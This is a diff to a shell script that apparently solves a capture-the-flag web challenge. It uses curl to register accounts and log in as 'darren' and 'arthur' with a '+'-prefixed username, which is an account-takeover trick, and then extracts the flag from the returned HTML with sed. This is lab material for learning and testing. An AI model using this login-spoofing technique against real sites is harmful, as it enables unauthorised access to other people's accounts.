@@ -24,7 +24,7 @@ curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L 
 # Logging as adrren
 echo "5 - ANALYZING DARREN"
 curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+darren" -d "pass=test" -o /work/7-darren.html
-echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-darren.html  | sed ':a;N;$!ba;s/\n//g')" 
+echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-darren.html | sed ':a;N;$!ba;s/[\n\t ]//g')" 
 
 # Registering arthur a second time
 echo "4 - REGISTERING ARTHUR"
@@ -33,5 +33,5 @@ curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L 
 # Logging as arthur
 echo "5 - ANALYZING ARTHUR"
 curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+arthur" -d "pass=test" -v -o /work/7-arthur.html
-echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-arthur.html  | sed ':a;N;$!ba;s/\n//g')"
+echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-arthur.html | sed ':a;N;$!ba;s/[\n\t ]//g')"
 
